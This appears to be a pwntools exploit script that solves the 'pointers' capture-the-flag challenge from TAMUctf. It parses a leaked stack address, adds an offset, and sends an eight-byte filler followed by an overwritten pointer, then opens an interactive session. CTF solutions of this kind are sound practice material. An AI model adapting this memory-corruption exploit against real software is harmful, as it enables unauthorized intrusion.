#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        b *main+74
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="pointers")
    else:
        return process(binary)

def exploit(p,e,r):


    #payload = b"\x00\x00\xc6"

    p.recvuntil(b"at ")

    leak = int(p.recvline(),16) + 0x28

    payload = b"A" * 8 + p64(leak)
    #print(leak)

    p.send(payload)
    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
